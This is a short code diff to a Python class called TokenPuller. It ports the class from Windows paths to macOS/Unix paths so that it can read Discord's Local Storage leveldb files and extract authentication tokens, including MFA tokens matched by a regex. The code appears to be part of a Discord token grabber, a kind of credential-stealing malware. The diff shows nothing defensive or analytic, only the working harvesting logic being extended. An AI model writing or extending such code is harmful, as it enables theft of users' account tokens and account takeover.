@@ -40,7 +40,7 @@ class TokenPuller:
     MFA_TOKEN_REGEX = re.compile(r"mfa\.[\w-]{84}")
 
     def get_tokens_from_path(self, path: str) -> List[str]:
-        path += r"\Local Storage\leveldb"
+        path += "/Local Storage/leveldb"
 
         if not os.path.exists(path):
             return []
@@ -53,7 +53,7 @@ class TokenPuller:
         ]
 
         for file_name in file_names:
-            with open(f"{path}\\{file_name}", errors="ignore") as f:
+            with open(f"{path}/{file_name}", errors="ignore") as f:
                 content = f.readlines()
 
                 for line in [x.strip() for x in content if x.strip()]:
@@ -69,7 +69,7 @@ class TokenPuller:
         roaming = os.getenv("APPDATA")
 
         if not local or not roaming:
-            return ["Library/Application Support/Discord"]
+            return [f"{os.getenv('HOME')}/Library/Application Support/discord"]
 
         return [
             roaming + r"\Discord",
